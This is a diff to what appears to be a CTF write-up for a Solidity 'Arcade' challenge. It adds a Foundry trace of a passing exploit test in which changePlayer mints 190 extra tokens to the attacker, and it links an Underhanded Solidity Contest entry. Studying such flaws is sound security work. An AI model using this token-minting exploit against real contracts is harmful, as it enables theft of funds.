@@ -68,6 +68,35 @@ POC:
     }
 ```
 
+```
+[PASS] testExploit() (gas: 133678)
+Traces:
+  [153578] ArcadeTest::testExploit()
+    ├─ [0] VM::warp(600)
+    │   └─ ← [Return] 
+    ├─ [0] VM::startPrank(You: [0x5F82A812Fa0bF05D4336C8317833f5DCEFBfcCAE])
+    │   └─ ← [Return] 
+    ├─ [48615] Arcade::earn()
+    │   ├─ emit PlayerEarned(player: You: [0x5F82A812Fa0bF05D4336C8317833f5DCEFBfcCAE], currentPoints: 10)
+    │   └─ ← [Stop] 
+    ├─ [47144] Arcade::redeem()
+    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: You: [0x5F82A812Fa0bF05D4336C8317833f5DCEFBfcCAE], value: 10)
+    │   └─ ← [Stop] 
+    ├─ [10245] Arcade::changePlayer(0x4444bd21FA6Ec8846308e926B86D06b74f63f4aD)
+    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: You: [0x5F82A812Fa0bF05D4336C8317833f5DCEFBfcCAE], value: 190)
+    │   ├─ emit PlayerChanged(oldPlayer: You: [0x5F82A812Fa0bF05D4336C8317833f5DCEFBfcCAE], newPlayer: 0x4444bd21FA6Ec8846308e926B86D06b74f63f4aD)
+    │   └─ ← [Stop] 
+    ├─ [27568] ArcadeBase::solve()
+    │   ├─ [673] Arcade::balanceOf(You: [0x5F82A812Fa0bF05D4336C8317833f5DCEFBfcCAE]) [staticcall]
+    │   │   └─ ← [Return] 200
+    │   └─ ← [Stop] 
+    ├─ [375] ArcadeBase::isSolved() [staticcall]
+    │   └─ ← [Return] true
+    ├─ [0] VM::stopPrank()
+    │   └─ ← [Return] 
+    └─ ← [Stop] 
+```
+
 相关链接：
 
 [Underhanded Solidity Contest 2022 winning entry](https://github.com/ethereum/solidity-underhanded-contest/blob/master/2022/submissions_2022/submission9_TynanRichards/SPOILERS.md)
